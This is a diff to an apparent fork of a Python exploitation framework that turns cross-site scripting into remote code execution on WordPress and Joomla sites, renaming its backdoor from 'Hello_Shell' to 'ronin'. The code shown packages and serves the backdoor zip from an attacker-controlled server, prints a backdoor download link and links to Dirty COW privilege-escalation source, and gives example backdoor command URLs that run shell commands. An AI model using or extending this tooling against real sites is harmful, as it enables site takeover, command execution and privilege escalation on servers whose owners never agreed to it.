@@ -4,10 +4,10 @@
 # Version: 2.7.5 - Black Hat Europe Release + Extras
 # Music Codename: Soul Cypherz - Maya
 # Presentation Date: 07/Dec/17
-# Release Date: 08/Mar/2018
-# Author: Hans-Michael Varbaek
+# Release Date: 08/Mar/2018 - 2024
+# Author: Hans-Michael Varbaek - pxcs
 # Company: VarBITS
-# Special Credits: MaXe / InterN0T
+# Special Credits: MaXe / InterN0T - pxcs / Sulaiman
 #
 # TODO List:
 # - Use another type of web server that's easier to maintain.
@@ -69,13 +69,13 @@ def zipdir(path, ziph):
 # Generate the Hello Shell on startup.
 # TODO: Make the backdoor name fully dynamic in the future.
 def generate_helloshell():
-    zipf = zipfile.ZipFile('Hello_Shell.zip', 'w', zipfile.ZIP_DEFLATED)
-    zipdir('Hello_Shell/', zipf)
+    zipf = zipfile.ZipFile('ronin.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('ronin/', zipf)
     zipf.close()
 
 
-def enable_js_alert():
-    os.system("chmod +x js_alert.sh")
+def enable_ronin():
+    os.system("chmod +x ronin.sh")
 
 
 # Exit program - Default return code is zero.
@@ -134,11 +134,11 @@ class MyHandler(BaseHTTPRequestHandler):
                 # NEW CODE BELOW
                 # Terminal and Popup Terminal Notifications
                 print FontColors.YELLOW + FontColors.BOLD + "[!] JavaScript payload was activated!" + FontColors.ENDC
-                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"')  # ASCII ART
+                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./ronin.sh; exec bash\'"')  # ASCII ART
                 # Everything seems to becoming deprecated with gnome-terminal, so we've switched to xterm.
                 # xterm -hold -e command
-                # check_output(['xterm', '-fa', '"Monospace"', '-fs', '14', '-hold', '-e', './js_alert.sh', '&'])
-                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./js_alert.sh &')  # Size 14 is quite large
+                # check_output(['xterm', '-fa', '"Monospace"', '-fs', '14', '-hold', '-e', './ronin.sh', '&'])
+                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./ronin.sh &')  # Size 14 is quite large
                 # xterm -hold -e 'ls' &  # Without the ampersand xterm blocks the python script from executing.
                 # TODO: Replace os.system with e.g. subprocess.call() or check_output() in future versions.
                 # subprocess.call(["ls", "-al"])
@@ -217,8 +217,8 @@ class WordPressHandler(BaseHTTPRequestHandler):
                 # NEW CODE BELOW
                 # Terminal and Popup Terminal Notifications
                 print FontColors.YELLOW + FontColors.BOLD + "[!] JavaScript payload was activated!" + FontColors.ENDC
-                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"')  # ASCII ART
-                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./js_alert.sh &')
+                # os.system('gnome-terminal --hide-menubar -e "bash -c \' ./ronin.sh; exec bash\'"')  # ASCII ART
+                os.system('xterm -fa "Monospace" -fs 14 -hold -e ./ronin.sh &')
                 # New method as gnome-terminal deprecated/removed too many options.
                 # Activate shell request for WordPress and Joomla
                 if activation_file is not "NOT_APPLICABLE":
@@ -264,11 +264,11 @@ class WordPressHandler(BaseHTTPRequestHandler):
 
             # TODO: Make the backdoor name dynamic in the future.
             # TODO: This shouldn't be too hard, as the file being read is now handled elsewhere.
-            if self.path.endswith("Hello_Shell.zip"):  # You can change this to anything.
+            if self.path.endswith("ronin.zip"):  # You can change this to anything.
                 self.send_response(200)  # Just make sure it's consistent throughout the script.
                 # self.send_header('Content-type', 'text/plain')
                 self.send_header('Content-type', 'application/octet-stream')
-                self.send_header('Content-Disposition', 'attachment; filename=Hello_Shell.zip')
+                self.send_header('Content-Disposition', 'attachment; filename=ronin.zip')
                 self.end_headers()
                 self.wfile.write(read_joomla_shell_file())
                 return
@@ -330,7 +330,7 @@ def you_got_shell():  # Now PEP8 (i.e. the IDE) is happy with the renamed functi
 
 # TODO: Make the filename dynamic in the future
 def read_joomla_shell_file():
-    with open("Hello_Shell.zip", "rb") as filename:
+    with open("ronin.zip", "rb") as filename:
         return filename.read()
 
 
@@ -856,7 +856,7 @@ def handle_exploit(exploit, localhost):
                                 print ' [!] Your password is: ' + FontColors.BLUE + FontColors.BOLD + \
                                       joomla_password + FontColors.ENDC + ' '
                             # TODO: Backdoor filename should be dynamic in the future.
-                            print ' [!] Backdoor Link: http://{}:{}/Hello_Shell.zip'.format(localhost, http_port)
+                            print ' [!] Backdoor Link: http://{}:{}/ronin.zip'.format(localhost, http_port)
                             print ' [+] DCOW (SUID) 32-bit src is available at: http://{}:{}/dcow32.c'.format(
                                   localhost, http_port)
                             print ' [+] DCOW (SUID) 64-bit src is available at: http://{}:{}/dcow64.c'.format(
@@ -957,7 +957,7 @@ def update_javascript_payload(payload_type, php_input):
             print " [*] Using semi-automatic Joomla backdoor. \n" \
                   " [*] Example: /index.php?option=com_helloshell&c64=bHMgLWFs \n" \
                   " [*] Example: /index.php?option=com_helloshell&c=ls"
-            attacker_url = "http://{}:{}/{}".format(lhost, "80", "Hello_Shell.zip")
+            attacker_url = "http://{}:{}/{}".format(lhost, "80", "ronin.zip")
             # TODO: Listening port and filename should be dynamic in the future.
             # print " DEBUG: Attacker URL: %s" % attacker_url
             # TODO: Another important future rewrite
@@ -1126,9 +1126,9 @@ payload_menu = {
  
 # Main Program
 if __name__ == "__main__":
-    # Generate the hello_shell.zip file
+    # Generate the ronin.zip file
     generate_helloshell()
-    # Make the js_alert.sh file executable
-    enable_js_alert()
+    # Make the ronin.sh file executable
+    enable_ronin()
     # Launch the main menu
     main_menu()
